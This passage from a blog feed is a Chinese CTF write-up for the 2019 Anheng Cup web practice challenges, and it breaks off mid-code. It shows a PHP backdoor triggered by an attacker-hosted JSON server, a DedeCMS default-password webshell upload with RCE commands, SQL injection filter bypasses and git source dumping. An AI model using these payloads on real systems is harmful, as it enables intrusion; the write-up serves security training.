        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3946db7e573043518daa8f82f90c988c2c1035018074993beac17007b598d0ba"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 源码安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码安全 </tag>
            
            <tag> 白盒扫描 </tag>
            
            <tag> Fortify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019“安恒杯”WEB安全测试秋季大赛练习题wp</title>
      <link href="/ctf-2019%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E7%BB%83%E4%B9%A0%E9%A2%98wp/"/>
      <url>/ctf-2019%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E7%BB%83%E4%B9%A0%E9%A2%98wp/</url>
      
        <content type="html"><![CDATA[<h1 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h1><h2 id="0x01-路径遍历"><a href="#0x01-路径遍历" class="headerlink" title="0x01 路径遍历"></a>0x01 路径遍历</h2><p>打开地址看到路径遍历：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126059065.png" alt="1571126059065"></p><p>在upload文件夹下发现后门和其源码</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141073240.png" alt="1571141073240"></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571141089817.png" alt="1571141089817"></p><h2 id="0x02-后门审计"><a href="#0x02-后门审计" class="headerlink" title="0x02 后门审计"></a>0x02 后门审计</h2><p>格式化后，进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// UA是md5(POST['pass'])</span></span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里产生一个url</span></span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    <span class="comment">// 从url获取文件内容，SSRF</span></span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// CodeInjection, may cause RCE, e.g.,&#123;"f":"system","d":"ls"&#125;</span></span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span>.$f.$g; <span class="comment">// url=http://pass[30:35]+pass[10:20], i.e.,url&lt;=15</span></span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;<span class="comment">/*...*/</span>&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>其首先检查UA是否等于md5(POST[‘pass’])，接着取pass参数的两部分（pass长度要求大于40），组装成一个url，从该url获取一个json，再从json中的f变量获取函数名，d变量获取参数，并执行。</p><h2 id="0x03-构造恶意json"><a href="#0x03-构造恶意json" class="headerlink" title="0x03 构造恶意json"></a>0x03 构造恶意json</h2><p>按之前分析，最省事的方法是在自己服务器上一起个80服务，然后返回恶意json</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,jsonify</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srv</span><span class="params">()</span>:</span></span><br><span class="line">    resp=dict(f=<span class="string">"system"</span>,d=<span class="string">"ls"</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(resp), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-后门利用"><a href="#0x04-后门利用" class="headerlink" title="0x04 后门利用"></a>0x04 后门利用</h2><p>最后一步，构造后门请求。首先，假设我服务器是216.126.239.124</p><p>先生成pass参数，画个草图好写代码：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571317896911.png" alt="1571317896911"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: url=<span class="string">"216.126.239.124"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: _pass=<span class="string">'a'</span>*<span class="number">10</span>+url[<span class="number">5</span>:<span class="number">15</span>]+<span class="string">'b'</span>*<span class="number">10</span>+url[:<span class="number">5</span>]+<span class="string">'c'</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: _pass</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">'aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc'</span></span><br></pre></td></tr></table></figure><p>再生成UA：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [4]: import hashlib</span><br><span class="line"></span><br><span class="line">In [5]: hashlib.md5(_pass.encode(&apos;ascii&apos;)).hexdigest()</span><br><span class="line">Out[5]: &apos;98a36c28cf36c4d8eeb8055a3538562e&apos;</span><br></pre></td></tr></table></figure><p>尝试发送payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://114.55.36.69:8020/upload/dama.php -X POST -H &quot;User-agent: 98a36c28cf36c4d8eeb8055a3538562e&quot; -d &apos;pass=aaaaaaaaaa26.239.124bbbbbbbbbb216.1cccccccccc&apos;</span><br></pre></td></tr></table></figure><p>可以看到payload生效了：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571144854091.png" alt="1571144854091"></p><p>找一下flag，需要修改我们服务器上的payload</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145028036.png" alt="1571145028036"></p><p>然后找到目录<code>/var/www/html/flag.php</code>，cat得到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571145141787.png" alt="1571145141787"></p><h1 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h1><h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>打开是一个用织梦CMS写的网站，拉到最下面看到版本疑似是v5.7sp2，想到织梦CMSV5.7SP2后台存在代码执行漏洞，详情见<a href="https://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/164035.html</a></p><h2 id="0x01-弱密码"><a href="#0x01-弱密码" class="headerlink" title="0x01 弱密码"></a>0x01 弱密码</h2><p>访问 <code>/dede/login.php</code>，看到管理登录页面，这里存在弱密码： admin:admin</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571126576237.png" alt="1571126576237"></p><h2 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h2><p> todo</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>第一步，<code>GET /dede/tpl.php?action=upload</code>，获取csrftoken</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571127184086.png" alt="1571127184086"></p><p>第二步，<code>GET /dede/tpl.php?filename=anemone.lib.php&amp;action=savetagfile&amp;content=%3C?php%20var_dump(system($_GET[&#39;x&#39;]));?%3E&amp;token={csrf_token}</code>，上传一句话</p><p>第三步，<code>GET /include/taglib/anemone.lib.php?x=ls</code>，能RCE了：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128235789.png" alt="1571128235789"></p><h2 id="0x04-找flag"><a href="#0x04-找flag" class="headerlink" title="0x04 找flag"></a>0x04 找flag</h2><p><code>GET /include/taglib/anemone.lib.php?x=find%20/%20-name%20flag</code></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128339477.png" alt="1571128339477"></p><p><code>GET /include/taglib/anemone.lib.php?x=cat%20/tmp/flagishere/flagishere/flagishere/flag</code></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571128497061.png" alt="1571128497061"></p><p>（flag被人改了吗？）</p><h1 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p>尝试一些payload，看到有SQL注入：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571129558998.png" alt="1571129558998"></p><p>但是union,select会被过滤</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130055314.png" alt="1571130055314"></p><p>尝试<code>/*!select*/</code>绕过</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130170687.png" alt="1571130170687"></p><p>查库，得到news：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step2-1541417918841.png" alt="step2"></p><p>查表，得到admin表：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step3-1541417936188.png" alt="step3"></p><p>查列，得到flag列</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step4.png" alt="step4"></p><p>查记录，得到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/step5.png" alt="step5"></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>尝试sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -r D:\MEGAsync\mooctest2019exer\new-news.txt  --level 3 --risk 3</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 233 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: word=-2704<span class="string">' OR 5368=5368-- AyLy&amp;number=5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)</span></span><br><span class="line"><span class="string">    Payload: word=test'</span> OR SLEEP(5)-- pJuo&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h1><p>看到<code>/index.php?url=upload</code>可以想到url可能存在文件包含/SSRF/URLRedirect问题：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131861906.png" alt="1571131861906"></p><p>base64decode后得到flag</p><h1 id="新闻搜索"><a href="#新闻搜索" class="headerlink" title="新闻搜索"></a>新闻搜索</h1><p>尝试注入</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130487146.png" alt="1571130487146"></p><p>一步步注入得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word=test&apos; union select 1,2,3 %23&amp;number=5</span><br></pre></td></tr></table></figure><h1 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><p>扫描发现源代码泄露：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571130863836.png" alt="1571130863836"></p><p>还原源代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./Dumper/gitdumper.sh http://114.55.36.69:8023/.git/ /temp/hackerone</span><br><span class="line">./Extractor/extractor.sh /temp/hackerone /temp/hackerone</span><br></pre></td></tr></table></figure><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>从index.php:11-14看到，如果是管理员，则可以拿到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571212369176.png" alt="1571212369176"></p><p>跟is_admin(class.user.php):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">       <span class="comment">// 检查用户名是否合法</span></span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">       <span class="comment">//获取userfile，其中有一属性为is_admin</span></span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'is_admin'</span>] === <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_username</span><span class="params">($username)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($username) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^[_\.\-0-9a-zA-Z]+$/i'</span>, $username)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_attrs</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$users = zUserFile::get_all_users();</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $users[<span class="string">'attrs'</span>][$username];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>is_admin没有突破口，但是跟流程的时候，发现注册用户有切换用户功能，看一下切换用户逻辑怎么做的：</p><p>switch.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$userObj = <span class="keyword">new</span> zUser();</span><br><span class="line">$user = zUserFile::get_attrs($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$users = zUserFile::get_relate_users($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($username != <span class="keyword">false</span> &amp;&amp; zUserFile::is_exists($username))&#123;</span><br><span class="line">$to_user = zUserFile::get_attrs($username);</span><br><span class="line">    <span class="comment">// 当前用户和目标用户以通过邮箱验证，并且当前用户邮箱与目标用户邮箱一致</span></span><br><span class="line"><span class="keyword">if</span>($user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $to_user[<span class="string">'email_verify'</span>] === <span class="number">1</span> &amp;&amp; $user[<span class="string">'email'</span>] === $to_user[<span class="string">'email'</span>])&#123;</span><br><span class="line">$userObj-&gt;login2($username);</span><br><span class="line">header(<span class="string">'Location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login2</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">$username = trim($username);</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::validate_username($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题转化为把自己邮箱弄成admin邮箱，继续审计绑定邮箱过程（chgemail.php、class.user.php）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(!chktoken())&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID REQUEST'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$email = <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>])?trim($_POST[<span class="string">'email'</span>]):<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;chg_email($_SESSION[<span class="string">'username'</span>], $email))<span class="comment">//修改绑定邮箱</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'SUCCESS'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'FAILED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">chg_email</span><span class="params">($username, $email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($email == <span class="keyword">false</span> || !zUserFile::validate_email($email))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$old_email = $user[<span class="string">'email'</span>];</span><br><span class="line">$emails = zUserFile::get_emails();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($emails[$old_email]))&#123;</span><br><span class="line">$emails[$old_email] = array_diff($emails[$old_email], <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">if</span>($emails[$old_email] == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">unset</span>($emails[$old_email]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 重绑定邮箱后，email_verify被重置, token被重置</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">0</span>);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email'</span>, $email);</span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">$us = @is_array($emails[$email])?$emails[$email]:<span class="keyword">array</span>();</span><br><span class="line">$emails[$email] = array_merge($us, <span class="keyword">array</span>($username));</span><br><span class="line"><span class="keyword">return</span> zUserFile::update_emails($emails);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($email) &gt; <span class="number">100</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> filter_var($email, FILTER_VALIDATE_EMAIL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说重新绑定邮箱时，需要重新发邮件，然后验证，再看下验证部分代码（verify.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'token'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">$token = <span class="keyword">isset</span>($_GET[<span class="string">'token'</span>])?trim($_GET[<span class="string">'token'</span>]):<span class="string">''</span>;</span><br><span class="line">$username = <span class="keyword">isset</span>($_GET[<span class="string">'username'</span>])?trim($_GET[<span class="string">'username'</span>]):<span class="string">''</span>;\</span><br><span class="line">    <span class="comment">// token和username不为空</span></span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span> || $username == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID INPUT'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($userObj-&gt;verify_email($username, $token))&#123;</span><br><span class="line">$userObj-&gt;login($username);</span><br><span class="line">header(<span class="string">'location: ./'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'INVALID TOKEN OR USERNAME'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class.user.php::zUser::verify_email</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_email</span><span class="params">($username, $token)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!zUserFile::is_exists($username))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$token = trim($token);</span><br><span class="line"><span class="keyword">if</span>($token == <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = zUserFile::get_attrs($username);</span><br><span class="line">$real_token = $user[<span class="string">"token"</span>];</span><br><span class="line">        <span class="comment">// 验证提交的token是否和数据库里的用户对应的token一致</span></span><br><span class="line"><span class="keyword">if</span>(md5($real_token) !== md5($token))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// token被重置</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'token'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// Condition Race</span></span><br><span class="line">        <span class="comment">// 